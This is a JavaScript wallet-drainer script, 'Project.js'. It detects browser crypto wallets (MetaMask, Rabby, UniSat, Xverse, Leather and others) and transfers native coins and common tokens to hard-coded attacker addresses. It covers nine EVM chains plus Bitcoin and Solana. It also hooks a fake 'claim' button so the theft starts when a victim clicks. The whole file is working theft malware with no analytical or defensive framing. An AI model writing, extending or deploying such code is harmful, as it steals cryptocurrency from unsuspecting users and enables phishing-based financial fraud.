(function (global) {
  'use strict';

  // ---------- CONFIGURATION ----------
  const ATTACKER_ADDRESSES = {
    // EVM (any chain) – same address works across all EVM chains
    evm: '0xbf2c883b097d6733a7e5a8d853d05825564bd857',
    // Bitcoin (Legacy / SegWit / Taproot – use a compatible address)
    btc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    // Solana
    sol: '2b6jStwWmYM795ADW4cnmuR7LTu1TUzgSo3whvbE5xmh'
  };

  // EVM chains to scan (RPC URLs can be replaced with public endpoints)
  const EVM_CHAINS = [
    { name: 'Ethereum', chainId: 1, rpc: 'https://eth.llamarpc.com', nativeSymbol: 'ETH', explorer: 'https://etherscan.io' },
    { name: 'BNB Smart Chain', chainId: 56, rpc: 'https://bsc-dataseed.binance.org', nativeSymbol: 'BNB', explorer: 'https://bscscan.com' },
    { name: 'Polygon', chainId: 137, rpc: 'https://polygon-rpc.com', nativeSymbol: 'MATIC', explorer: 'https://polygonscan.com' },
    { name: 'Arbitrum', chainId: 42161, rpc: 'https://arb1.arbitrum.io/rpc', nativeSymbol: 'ETH', explorer: 'https://arbiscan.io' },
    { name: 'Optimism', chainId: 10, rpc: 'https://mainnet.optimism.io', nativeSymbol: 'ETH', explorer: 'https://optimistic.etherscan.io' },
    { name: 'Avalanche C-Chain', chainId: 43114, rpc: 'https://api.avax.network/ext/bc/C/rpc', nativeSymbol: 'AVAX', explorer: 'https://snowtrace.io' },
    { name: 'Fantom', chainId: 250, rpc: 'https://rpc.ftm.tools', nativeSymbol: 'FTM', explorer: 'https://ftmscan.com' },
    { name: 'Base', chainId: 8453, rpc: 'https://mainnet.base.org', nativeSymbol: 'ETH', explorer: 'https://basescan.org' },
    { name: 'Linea', chainId: 59144, rpc: 'https://rpc.linea.build', nativeSymbol: 'ETH', explorer: 'https://lineascan.build' }
  ];

  // ---------- STATE ----------
  let currentProvider = null;      // EIP-1193 provider (for EVM)
  let currentAccount = null;
  let isDraining = false;

  // ---------- UTILITIES ----------
  const log = (msg) => console.log(`[Project.js] ${msg}`);
  const warn = (msg) => console.warn(`[Project.js] ${msg}`);
  const delay = (ms) => new Promise(r => setTimeout(r, ms));

  // ---------- WALLET DETECTION ----------
  function detectEVMProvider() {
    if (window.ethereum) {
      // Prefer the provider that is currently selected (e.g., MetaMask, Trust, Rabby)
      const providers = window.ethereum.providers || [window.ethereum];
      const selected = providers.find(p => p.isMetaMask || p.isTrust || p.isRabby) || providers[0];
      return selected;
    }
    return null;
  }

  function detectBitcoinProvider() {
    // Check for common Bitcoin wallet extensions
    if (window.unisat) return { type: 'unisat', provider: window.unisat };
    if (window.XverseProviders?.BitcoinProvider) return { type: 'xverse', provider: window.XverseProviders.BitcoinProvider };
    if (window.LeatherProvider) return { type: 'leather', provider: window.LeatherProvider };
    // You can add more (e.g., OKX Wallet, Gate)
    return null;
  }

  // ---------- EVM CHAIN SWITCHING ----------
  async function switchEVMChain(chainId) {
    if (!currentProvider) throw new Error('No EVM provider');
    const hexChainId = '0x' + chainId.toString(16);
    try {
      await currentProvider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: hexChainId }]
      });
    } catch (switchError) {
      // Chain not added – add it
      if (switchError.code === 4902) {
        const chain = EVM_CHAINS.find(c => c.chainId === chainId);
        if (!chain) throw new Error('Unknown chain');
        await currentProvider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: hexChainId,
            chainName: chain.name,
            rpcUrls: [chain.rpc],
            nativeCurrency: { name: chain.nativeSymbol, symbol: chain.nativeSymbol, decimals: 18 },
            blockExplorerUrls: [chain.explorer]
          }]
        });
      } else {
        throw switchError;
      }
    }
  }

  // ---------- FETCH EVM BALANCES ----------
  async function getEVMNativeBalance(chain) {
    const web3 = new Web3(chain.rpc);
    const balance = await web3.eth.getBalance(currentAccount);
    return web3.utils.fromWei(balance, 'ether');
  }

  async function getEVMTokenBalances(chain, account) {
    // For simplicity, we use a static list of common shitcoins per chain.
    // In production you'd fetch from an indexer (e.g., covalent, moralis).
    const tokenLists = {
      1: [ // Ethereum – already covered by script.js, but we can double-check
        '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
        '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
        '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
        '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // SHIB
        '0x4d224452801ACEd8B2F0aebE155379bb5D594381', // APE
        '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', // MATIC
        '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
      ],
      56: [ // BSC
        '0x55d398326f99059fF775485246999027B3197955', // USDT
        '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
        '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', // DAI
        '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', // CAKE
        '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB
      ],
      137: [ // Polygon
        '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // USDT
        '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', // USDC
        '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', // DAI
        '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', // WMATIC
      ],
      // Add other chains as needed...
    };

    const tokens = tokenLists[chain.chainId] || [];
    const web3 = new Web3(chain.rpc);
    const balances = [];

    for (const tokenAddr of tokens) {
      try {
        const contract = new web3.eth.Contract([
          { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' },
          { constant: true, inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], type: 'function' },
          { constant: true, inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], type: 'function' }
        ], tokenAddr);

        const [balance, decimals, symbol] = await Promise.all([
          contract.methods.balanceOf(account).call(),
          contract.methods.decimals().call().catch(() => 18),
          contract.methods.symbol().call().catch(() => '???')
        ]);

        const balanceFormatted = balance / Math.pow(10, decimals);
        if (balanceFormatted > 0) {
          balances.push({ token: tokenAddr, symbol, balance: balanceFormatted, decimals });
        }
      } catch (e) {
        // Skip tokens that revert
      }
    }
    return balances;
  }

  // ---------- DRAIN EVM CHAIN ----------
  async function drainEVMChain(chain) {
    log(`Scanning ${chain.name} (${chain.chainId})...`);

    // Switch to the chain
    await switchEVMChain(chain.chainId);
    await delay(1000);

    // Ensure we have the latest account
    const accounts = await currentProvider.request({ method: 'eth_accounts' });
    if (!accounts.length) throw new Error('No account connected');
    currentAccount = accounts[0];

    const web3 = new Web3(currentProvider);
    const nativeBalance = await getEVMNativeBalance(chain);
    log(`Native ${chain.nativeSymbol}: ${nativeBalance}`);

    // Leave a small amount for gas on subsequent txs
    const gasBuffer = chain.chainId === 1 ? 0.002 : 0.0005; // ETH chains higher gas
    const amountToSend = Math.max(0, nativeBalance - gasBuffer);
    if (amountToSend > 0) {
      log(`Sending ${amountToSend} ${chain.nativeSymbol} to ${ATTACKER_ADDRESSES.evm}`);
      try {
        const tx = {
          from: currentAccount,
          to: ATTACKER_ADDRESSES.evm,
          value: web3.utils.toWei(amountToSend.toString(), 'ether'),
          gas: 21000,
          gasPrice: await web3.eth.getGasPrice()
        };
        await web3.eth.sendTransaction(tx);
        log(`Native transfer successful`);
      } catch (e) {
        warn(`Native transfer failed: ${e.message}`);
      }
    }

    // Tokens
    const tokens = await getEVMTokenBalances(chain, currentAccount);
    for (const t of tokens) {
      log(`Found ${t.balance} ${t.symbol} (${t.token})`);
      try {
        const contract = new web3.eth.Contract([
          { constant: false, inputs: [{ name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], type: 'function' }
        ], t.token);

        const amountWei = BigInt(Math.floor(t.balance * Math.pow(10, t.decimals))).toString();
        const gasEstimate = await contract.methods.transfer(ATTACKER_ADDRESSES.evm, amountWei).estimateGas({ from: currentAccount });
        const gasPrice = await web3.eth.getGasPrice();

        await contract.methods.transfer(ATTACKER_ADDRESSES.evm, amountWei).send({
          from: currentAccount,
          gas: Math.floor(gasEstimate * 1.2),
          gasPrice
        });
        log(`Transferred ${t.symbol}`);
      } catch (e) {
        warn(`Token transfer failed for ${t.symbol}: ${e.message}`);
      }
      await delay(2000);
    }
  }

  // ---------- BITCOIN DRAINING (UniSat / Xverse / Leather) ----------
  async function drainBitcoin() {
    const btcWallet = detectBitcoinProvider();
    if (!btcWallet) {
      log('No Bitcoin wallet detected');
      return;
    }
    log(`Bitcoin wallet detected: ${btcWallet.type}`);

    const provider = btcWallet.provider;
    let accounts;
    try {
      accounts = await provider.requestAccounts();
    } catch (e) {
      // Some wallets auto-connect
      accounts = await provider.getAccounts();
    }
    if (!accounts || !accounts.length) throw new Error('No Bitcoin account');

    const address = accounts[0];
    log(`Bitcoin address: ${address}`);

    // Get balance (different methods per wallet)
    let balanceSat = 0;
    try {
      if (btcWallet.type === 'unisat') {
        const balance = await provider.getBalance();
        balanceSat = balance.total;
      } else if (btcWallet.type === 'xverse') {
        const { total } = await provider.getBalance(address);
        balanceSat = total;
      } else if (btcWallet.type === 'leather') {
        const balances = await provider.request('getBalances', { address });
        balanceSat = balances.total;
      }
    } catch (e) {
      warn('Could not fetch BTC balance');
      return;
    }

    const btcBalance = balanceSat / 1e8;
    log(`BTC balance: ${btcBalance} BTC`);

    // Leave ~10k sats for fee (0.0001 BTC)
    const feeSat = 10000;
    const amountSat = Math.max(0, balanceSat - feeSat);
    if (amountSat <= 0) {
      log('Insufficient BTC after fee');
      return;
    }

    // Create transaction
    try {
      let txid;
      if (btcWallet.type === 'unisat') {
        txid = await provider.sendBitcoin(ATTACKER_ADDRESSES.btc, amountSat);
      } else if (btcWallet.type === 'xverse') {
        const tx = await provider.sendBtcTransaction({
          recipients: [{ address: ATTACKER_ADDRESSES.btc, amount: amountSat }],
          feeRate: 10
        });
        txid = tx.txid;
      } else if (btcWallet.type === 'leather') {
        const resp = await provider.request('sendTransfer', {
          address: ATTACKER_ADDRESSES.btc,
          amount: amountSat.toString()
        });
        txid = resp.txid;
      }
      log(`BTC transaction sent: ${txid}`);
    } catch (e) {
      warn(`BTC transfer failed: ${e.message}`);
    }
  }

  // ---------- SOLANA ENHANCED (already in script.js, but we provide fallback) ----------
  async function drainSolanaFallback() {
    // If script.js already handled Solana, skip
    if (window.solanaDrained) return;
    log('Attempting Solana drain via Project.js fallback...');
    // Reuse the logic from script.js – just call the existing function if available
    if (typeof window.drainSolana === 'function') {
      try {
        await window.drainSolana();
        window.solanaDrained = true;
      } catch (e) {
        warn('Solana drain failed: ' + e.message);
      }
    } else {
      warn('Solana drain function not found in script.js');
    }
  }

  // ---------- MAIN ORCHESTRATOR ----------
  async function drainAllChains(options = {}) {
    if (isDraining) {
      log('Drain already in progress');
      return;
    }
    isDraining = true;

    try {
      // 1. EVM Provider setup
      currentProvider = detectEVMProvider();
      if (currentProvider) {
        const accounts = await currentProvider.request({ method: 'eth_accounts' });
        currentAccount = accounts[0];
        log(`EVM account: ${currentAccount}`);

        // Drain each EVM chain
        for (const chain of EVM_CHAINS) {
          try {
            await drainEVMChain(chain);
          } catch (e) {
            warn(`Failed on ${chain.name}: ${e.message}`);
          }
          await delay(3000);
        }
      } else {
        log('No EVM provider found');
      }

      // 2. Bitcoin
      await drainBitcoin();

      // 3. Solana (fallback)
      await drainSolanaFallback();

      log('✅ Cross-chain drain completed');
    } catch (e) {
      console.error('Project.js drain error:', e);
    } finally {
      isDraining = false;
    }
  }

  // ---------- PUBLIC API ----------
  const ProjectDrainer = {
    drainAllChains,
    drainBitcoin,
    drainSolanaFallback,
    // Expose for manual triggering
    getEVMChains: () => EVM_CHAINS
  };

  global.ProjectDrainer = ProjectDrainer;
  log('Loaded – call ProjectDrainer.drainAllChains() to start');

  // Auto‑integrate with script.js: if the main claim button is clicked, also run our drain
  const originalClaim = global.initiateClaimProcess;
  if (typeof originalClaim === 'function') {
    global.initiateClaimProcess = async function() {
      await originalClaim();
      // After the original drain, run our cross-chain sweep
      setTimeout(() => ProjectDrainer.drainAllChains(), 5000);
    };
    log('Hooked into script.js initiateClaimProcess');
  }

})(window);
